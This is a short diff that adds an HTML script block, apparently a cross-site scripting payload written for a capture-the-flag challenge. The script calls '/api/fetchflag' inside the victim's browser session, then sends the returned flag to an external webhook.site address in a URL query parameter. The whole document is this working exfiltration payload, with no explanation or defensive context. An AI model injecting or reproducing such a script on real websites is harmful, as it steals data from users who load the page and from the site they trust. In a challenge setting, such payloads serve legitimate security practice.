@@ -1,0 +1,8 @@
+<script>
+  fetch("/api/fetchflag")
+    .then(r => r.json())
+    .then(d => {
+      fetch("https://webhook.site/9ae16264-eaed-4673-966f-821ed1e27ada/?flag=" 
+        + encodeURIComponent(d.flag));
+    });
+</script>
